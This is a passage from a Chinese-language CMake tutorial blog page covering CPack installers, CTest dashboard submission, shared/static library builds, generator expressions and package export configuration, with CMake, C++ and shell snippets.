title="构建安装程序"></a>构建安装程序</h1><p>接下来假设我们想把我们的项目发布给其他人，以便他们能够使用它。我们希望在不同的平台上提供二进制和源代码的发布。这与我们之前在安装和测试（第4步）中所做的安装有些不同，在这里我们安装的是我们从源代码中构建的二进制文件。在这个例子中，我们将构建支持二进制安装和包管理功能的安装包。为了完成这个任务，我们将使用<code>CPack</code>来创建特定平台的安装包。具体来说，我们需要在顶层<code>CMakeLists.txt</code>文件的底部添加几行内容:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(InstallRequiredSystemLibraries)</span><br><span class="line"><span class="keyword">set</span>(CPACK_RESOURCE_FILE_LICENSE <span class="string">"${CMAKE_CURRENT_SOURCE_DIR}/License.txt"</span>)</span><br><span class="line"><span class="keyword">set</span>(CPACK_PACKAGE_VERSION_MAJOR <span class="string">"${Tutorial_VERSION_MAJOR}"</span>)</span><br><span class="line"><span class="keyword">set</span>(CPACK_PACKAGE_VERSION_MINOR <span class="string">"${Tutorial_VERSION_MINOR}"</span>)</span><br><span class="line"><span class="keyword">include</span>(CPack)</span><br></pre></td></tr></tbody></table></figure><p>首先包含<code>InstallRequiredSystemLibraries</code>。这个模块将包含项目在当前平台上需要的任何运行时库。接下来，我们设置一些<code>CPack</code>变量，将这个项目的许可证和版本信息存储在那里。版本信息在本教程的前面已经设置好了，<code>license.txt</code>已经包含在本步骤的顶层源目录中:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is the open source License.txt file introduced in</span><br><span class="line">CMake/Tutorial/Step7...</span><br></pre></td></tr></tbody></table></figure><p>最后我们加入<code>CPack</code>模块，它将使用这些变量和当前系统的一些其他属性来设置安装程序。</p><p>下一步是以通常的方式构建项目，然后运行<code>cpack</code>可执行文件。要构建一个二进制发行版，请在二进制目录下运行。</p><p>要指定生成器，请使用<code>-G</code>选项。对于多配置的构建，使用<code>-C</code>来指定配置。例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpack -G ZIP -C Debug</span><br></pre></td></tr></tbody></table></figure><p>要创建一个源码分发，可以输入：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpack --config CPackSourceConfig.cmake</span><br></pre></td></tr></tbody></table></figure><p>或者，运行<code>make package</code>或右键点击<code>Package</code> target并从IDE中构建项目。</p><p>运行在二进制目录下找到的安装程序。然后运行已安装的可执行文件，并验证它是否工作。</p><h1 id="添加DashBoard支持"><a href="#添加DashBoard支持" class="headerlink" title="添加DashBoard支持"></a>添加DashBoard支持</h1><p>添加支持将我们的测试结果提交到dashboard很简单。我们已经为我们的项目定义了一些测试。现在我们只需要运行这些测试并将它们提交到仪表板。为了包含对仪表盘的支持，我们在顶层的<code>CMakeLists.txt</code>中加入了<code>CTest</code>模块:</p><p>将<code>enable_testing()</code>替换为<code>include(CTest)</code>。</p><p><code>CTest</code>模块会自动调用<code>enable_testing()</code>，所以我们可以从<code>CMake</code>文件中删除它。</p><p>我们还需要在顶层目录下创建一个<code>CTestConfig.cmake</code>文件，在这里我们可以指定项目的名称和提交<code>dashboard</code>的位置。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(CTEST_PROJECT_NAME <span class="string">"CMakeTutorial"</span>)</span><br><span class="line"><span class="keyword">set</span>(CTEST_NIGHTLY_START_TIME <span class="string">"00:00:00 EST"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CTEST_DROP_METHOD <span class="string">"http"</span>)</span><br><span class="line"><span class="keyword">set</span>(CTEST_DROP_SITE <span class="string">"my.cdash.org"</span>)</span><br><span class="line"><span class="keyword">set</span>(CTEST_DROP_LOCATION <span class="string">"/submit.php?project=CMakeTutorial"</span>)</span><br><span class="line"><span class="keyword">set</span>(CTEST_DROP_SITE_CDASH <span class="keyword">TRUE</span>)</span><br></pre></td></tr></tbody></table></figure><p>当<code>ctest</code>可执行文件运行时，它将读取这个文件。要创建一个简单的dashboard，你可以运行<code>cmake</code>可执行文件或<code>cmake-gui</code>来配置项目，但先不要构建它。切换到二叉树状目录，然后运行。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctest [-VV] -D Experimental</span><br></pre></td></tr></tbody></table></figure><p>请记住，对于多配置生成器（如Visual Studio），必须指定配置类型。</p><h1 id="混合静态和共享"><a href="#混合静态和共享" class="headerlink" title="混合静态和共享"></a>混合静态和共享</h1><p>在这一节中，将展示如何使用<code>BUILD_SHARED_LIBS</code>变量来控制<code>add_library()</code>的默认行为，并允许控制没有明确类型(<code>STATIC, SHARED, MODULE or OBJECT</code>)的库的构建方式。</p><p>为了达到这个目的，我们需要在顶层的<code>CMakeLists.txt</code>中添加<code>BUILD_SHARED_LIBS</code>。我们使用<code>option()</code>命令，因为它允许用户选择性地选择该值是否应该是ON或OFF。</p><p>接下来我们将重构 <code>MathFunctions</code>， 使其成为一个真正的库， 封装使用 <code>mysqrt</code> 或 <code>sqrt</code>， 而不是要求调用代码来完成这个逻辑。这也意味着 <code>USE_MYMATH</code>将不会控制构建 <code>MathFunctions</code>，而是控制这个库的行为。</p><p>第一步是更新顶层<code>CMakeLists.txt</code>的起始部分， 使其看起来像这样:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the project name and version</span></span><br><span class="line"><span class="keyword">project</span>(Tutorial VERSION <span class="number">1.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># specify the C++ standard</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD_REQUIRED <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># control where the static and shared libraries are built so that on windows</span></span><br><span class="line"><span class="comment"># we don't need to tinker with the path to run the executable</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_ARCHIVE_OUTPUT_DIRECTORY <span class="string">"${PROJECT_BINARY_DIR}"</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_LIBRARY_OUTPUT_DIRECTORY <span class="string">"${PROJECT_BINARY_DIR}"</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_RUNTIME_OUTPUT_DIRECTORY <span class="string">"${PROJECT_BINARY_DIR}"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span>(BUILD_SHARED_LIBS <span class="string">"Build using shared libraries"</span> <span class="keyword">ON</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># configure a header file to pass the version number only</span></span><br><span class="line"><span class="keyword">configure_file</span>(TutorialConfig.h.in TutorialConfig.h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the MathFunctions library</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(MathFunctions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the executable</span></span><br><span class="line"><span class="keyword">add_executable</span>(Tutorial tutorial.cxx)</span><br><span class="line"><span class="keyword">target_link_libraries</span>(Tutorial PUBLIC MathFunctions)</span><br></pre></td></tr></tbody></table></figure><p>现在我们已经让<code>MathFunctions</code>始终被使用，接下来需要更新该库的逻辑。因此， 在 <code>MathFunctions/CMakeLists.txt</code>中， 我们需要创建一个 <code>SqrtLibrary</code>， 当 <code>USE_MYMATH</code> 启用时， 这个<code>SqrtLibrary</code>将有条件地被构建和安装。由于这是一个教程， 我们将明确要求静态地构建 <code>SqrtLibrary</code>。</p><p>最终的结果是<code>MathFunctions/CMakeLists.txt</code> 应该是这样的:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add the library that runs</span></span><br><span class="line"><span class="keyword">add_library</span>(MathFunctions MathFunctions.cxx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># state that anybody linking to us needs to include the current source dir</span></span><br><span class="line"><span class="comment"># to find MathFunctions.h, while we don't.</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(MathFunctions</span><br><span class="line">                           INTERFACE <span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span></span><br><span class="line">                           )</span><br><span class="line"></span><br><span class="line"><span class="comment"># should we use our own math functions</span></span><br><span class="line"><span class="keyword">option</span>(USE_MYMATH <span class="string">"Use tutorial provided math implementation"</span> <span class="keyword">ON</span>)</span><br><span class="line"><span class="keyword">if</span>(USE_MYMATH)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">target_compile_definitions</span>(MathFunctions PRIVATE <span class="string">"USE_MYMATH"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># first we add the executable that generates the table</span></span><br><span class="line">  <span class="keyword">add_executable</span>(MakeTable MakeTable.cxx)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># add the command to generate the source code</span></span><br><span class="line">  <span class="keyword">add_custom_command</span>(</span><br><span class="line">    OUTPUT <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">    <span class="keyword">COMMAND</span> MakeTable <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">    DEPENDS MakeTable</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># library that just does sqrt</span></span><br><span class="line">  <span class="keyword">add_library</span>(SqrtLibrary STATIC</span><br><span class="line">              mysqrt.cxx</span><br><span class="line">              <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># state that we depend on our binary dir to find Table.h</span></span><br><span class="line">  <span class="keyword">target_include_directories</span>(SqrtLibrary PRIVATE</span><br><span class="line">                             <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span></span><br><span class="line">                             )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">target_link_libraries</span>(MathFunctions PRIVATE SqrtLibrary)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># define the symbol stating we are using the declspec(dllexport) when</span></span><br><span class="line"><span class="comment"># building on windows</span></span><br><span class="line"><span class="keyword">target_compile_definitions</span>(MathFunctions PRIVATE <span class="string">"EXPORTING_MYMATH"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># install rules</span></span><br><span class="line"><span class="keyword">set</span>(installable_libs MathFunctions)</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">TARGET</span> SqrtLibrary)</span><br><span class="line">  <span class="keyword">list</span>(APPEND installable_libs SqrtLibrary)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"><span class="keyword">install</span>(TARGETS <span class="variable">${installable_libs}</span> DESTINATION lib)</span><br><span class="line"><span class="keyword">install</span>(FILES MathFunctions.h DESTINATION <span class="keyword">include</span>)</span><br></pre></td></tr></tbody></table></figure><p>接下来，更新 <code>MathFunctions/mysqrt.cxx</code>，使用 <code>mathfunctions</code>和 <code>detail</code> 命名空间。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MathFunctions.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Table.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mathfunctions {</span><br><span class="line"><span class="keyword">namespace</span> detail {</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> result = x;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt; <span class="number">10</span>) {</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Use the table to help find an initial value "</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        result = sqrtTable[<span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(x)];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// do ten iterations</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">        <span class="keyword">if</span> (result &lt;= <span class="number">0</span>) {</span><br><span class="line">            result = <span class="number">0.1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">double</span> delta = x - (result * result);</span><br><span class="line">        result = result + <span class="number">0.5</span> * delta / result;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Computing sqrt of "</span> &lt;&lt; x &lt;&lt; <span class="string">" to be "</span> &lt;&lt; result</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">} <span class="comment">// namespace detail</span></span><br><span class="line">} <span class="comment">// namespace mathfunctions</span></span><br></pre></td></tr></tbody></table></figure><p>我们还需要在 <code>tutorial.cxx</code>中做一些修改， 使它不再使用 <code>USE_MYMATH</code>:</p><ul><li><p>始终include <code>MathFunctions.h</code></p></li><li><p>始终使用 <code>mathfunctions::sqrt</code></p></li><li><p>不要include <code>cmath</code></p></li></ul><p><code>mysqrt.h</code>如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> mathfunctions {</span><br><span class="line"><span class="keyword">namespace</span> detail {</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line">}</span><br><span class="line">} <span class="comment">// namespace mathfunctions</span></span><br></pre></td></tr></tbody></table></figure><p><code>MathFunctions.cxx</code>如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MathFunctions.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYMATH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mysqrt.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mathfunctions {</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">sqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>{</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYMATH</span></span><br><span class="line">    <span class="keyword">return</span> detail::mysqrt(x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">sqrt</span>(x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">}</span><br><span class="line">} <span class="comment">// namespace mathfunctions</span></span><br></pre></td></tr></tbody></table></figure><p>最后，更新<code>MathFunctions/MathFunctions.h</code>，使用dll导出定义：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_WIN32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(EXPORTING_MYMATH)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLSPEC __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLSPEC __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// non windows</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLSPEC</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mathfunctions {</span><br><span class="line"><span class="function"><span class="keyword">double</span> DECLSPEC <span class="title">sqrt</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此时，如果你构建了所有的东西，你可能会注意到链接失败，因为我们将一个没有地址无关代码的静态库与一个有地址无关的库结合在一起。解决这个问题的方法是，无论构建类型如何，都要显式地将<code>SqrtLibrary</code>的<code>POSITION_INDEPENDENT_CODE</code>目标属性设置为True。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># state that SqrtLibrary need PIC when the default is shared libraries</span></span><br><span class="line"><span class="keyword">set_target_properties</span>(SqrtLibrary PROPERTIES</span><br><span class="line">POSITION_INDEPENDENT_CODE <span class="variable">${BUILD_SHARED_LIBS}</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(MathFunctions PRIVATE SqrtLibrary)</span><br></pre></td></tr></tbody></table></figure><h1 id="添加生成器表达式"><a href="#添加生成器表达式" class="headerlink" title="添加生成器表达式"></a>添加生成器表达式</h1><p>在构建系统生成期间会执行<code>Generator expression</code>，以生成特定于每个构建配置的信息。</p><p>在许多目标属性（例如<code>LINK_LIBRARIES</code>，<code>INCLUDE_DIRECTORIES</code>，<code>COMPLIE_DEFINITIONS</code>等）的上下文中允许<code>Generator expression</code>。在使用命令填充这些属性（例如<code>target_link_libraries()</code>，<code>target_include_directories()</code>，<code>target_compile_definitions()</code>等）时，也可以使用它们。</p><p><code>Generator expression</code>可用于启用条件链接、编译时使用的条件定义、条件include目录等。这些条件可以基于构建配置、目标属性、平台信息或任何其他可查询的信息。</p><p>有不同类型的<code>Generator expression</code>，包括逻辑表达式、信息表达式和输出表达式。</p><p>逻辑表达式用于创建条件输出。基本的表达式是0和1表达式。<code>$&lt;0:...&gt;</code>的结果是空字符串，<code>&lt;1:...&gt;</code>的结果是<code>"... "</code>的内容。它们也可以嵌套。</p><p><code>Generator expression</code>的一个常见用法是有条件地添加编译器标志，例如语言级别或警告的标志。一个很好的模式是将这些信息关联到一个<code>INTERFACE</code>目标，允许这些信息传播。让我们从构造一个<code>INTERFACE</code>目标开始，并指定所需的C++标准为11，而不是使用<code>CMAKE_CXX_STANDARD</code>。</p><p>原代码如下：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># specify the C++ standard</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD_REQUIRED <span class="keyword">True</span>)</span><br></pre></td></tr></tbody></table></figure><p>替换为：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(tutorial_compiler_flags INTERFACE)</span><br><span class="line"><span class="keyword">target_compile_features</span>(tutorial_compiler_flags INTERFACE cxx_std_11)</span><br></pre></td></tr></tbody></table></figure><p>接下来，我们为项目添加所需的编译器警告标志。由于警告标志因编译器而异，因此我们使用<code>COMPILE_LANG_AND_ID</code>生成器表达式来控制在给定语言和一组编译器ID的情况下应应用的标志，如下所示：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(gcc_like_cxx <span class="string">"$&lt;COMPILE_LANG_AND_ID:CXX,ARMClang,AppleClang,Clang,GNU&gt;"</span>)</span><br><span class="line"><span class="keyword">set</span>(msvc_cxx <span class="string">"$&lt;COMPILE_LANG_AND_ID:CXX,MSVC&gt;"</span>)</span><br><span class="line"><span class="keyword">target_compile_options</span>(tutorial_compiler_flags INTERFACE</span><br><span class="line">  <span class="string">"$&lt;${gcc_like_cxx}:$&lt;BUILD_INTERFACE:-Wall;-Wextra;-Wshadow;-Wformat=2;-Wunused&gt;&gt;"</span></span><br><span class="line">  <span class="string">"$&lt;${msvc_cxx}:$&lt;BUILD_INTERFACE:-W3&gt;&gt;"</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p>查看此内容，我们看到警告标志封装在<code>BUILD_INTERFACE</code>条件内。这样做是为了使我们已安装项目的使用者不会继承我们的警告标志。</p><h1 id="添加导出配置"><a href="#添加导出配置" class="headerlink" title="添加导出配置"></a>添加导出配置</h1><p>在教程的“安装和测试”中，我们添加了CMake安装项目的库和头文件的功能。在”构建安装程序“期间，我们添加了打包这些信息的功能，以便可以将其分发给其他人。</p><p>下一步是添加必要的信息，以便其他CMake项目可以使用我们的项目，无论是从构建目录，本地安装还是打包时。</p><p>第一步是更新我们的<code>install（TARGETS）</code>命令，不仅要指定<code>DESTINATION</code>，还要指定<code>EXPORT</code>。 <code>EXPORT</code>关键字生成并安装一个<code>CMake</code>文件，该文件包含用于从安装树中导入<code>install</code>命令中列出的所有目标的代码。因此，让我们继续，通过更新<code>MathFunctions/CMakeLists.txt</code>中的<code>install</code>命令，显式导出<code>MathFunctions</code>库，如下所示：</p><p>现在我们已经导出了<code>MathFunctions</code>，我们还需要显式安装生成的<code>MathFunctionsTargets.cmake</code>文件。通过将以下内容添加到顶层的<code>CMakeLists.txt</code>的底部来完成：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">install</span>(<span class="keyword">EXPORT</span> MathFunctionsTargets</span><br><span class="line">  <span class="keyword">FILE</span> MathFunctionsTargets.cmake</span><br><span class="line">  DESTINATION lib/cmake/MathFunctions</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p>然后尝试构建项目，应该会遇到类似下面的错误：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CMake Error <span class="keyword">in</span> MathFunctions/CMakeLists.txt:</span><br><span class="line">  Target <span class="string">"MathFunctions"</span> INTERFACE_INCLUDE_DIRECTORIES property contains</span><br><span class="line">  path:</span><br><span class="line"></span><br><span class="line">    <span class="string">"/Users/wmc/vscode/cmake/tutorial/MathFunctions"</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">which</span> is prefixed <span class="keyword">in</span> the <span class="built_in">source</span> directory.</span><br></pre></td></tr></tbody></table></figure><p>CMake试图说的是，在生成导出信息的过程中，它将导出与当前机器上的绝对路径，在其他机器上无效。解决方案是更新<code>MathFunctions</code>的 <code>target_include_directories()</code>，以让CMake了解当从构建目录内和从安装/包中使用时，它需要不同的 INTERFACE 位置。这意味着将<code>MathFunctions</code>的<code>target_include_directories()</code>调用转换为如下样子:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(MathFunctions</span><br><span class="line">                           INTERFACE</span><br><span class="line">                            $&lt;BUILD_INTERFACE:<span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span>&gt;</span><br><span class="line">                            $&lt;INSTALL_INTERFACE:<span class="keyword">include</span>&gt;</span><br><span class="line">                           )</span><br></pre></td></tr></tbody></table></figure><p>修改后重新运行CMake，应该不会再有警告了。</p><p>此时，我们已经让CMake正确地打包了所需的目标信息，但我们仍然需要生成一个<code>MathFunctionsConfig.cmake</code>，这样<code>CMake find_package()</code>命令才能找到我们的项目。所以我们继续在项目的顶层添加一个新文件，名为<code>Config.cmake.in</code>，内容如下。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@PACKAGE_INIT@</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> ( <span class="string">"${CMAKE_CURRENT_LIST_DIR}/MathFunctionsTargets.cmake"</span> )</span><br></pre></td></tr></tbody></table></figure><p>然后，为了正确配置和安装该文件，在顶层<code>CMakeLists.txt</code>的底部添加以下内容:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span 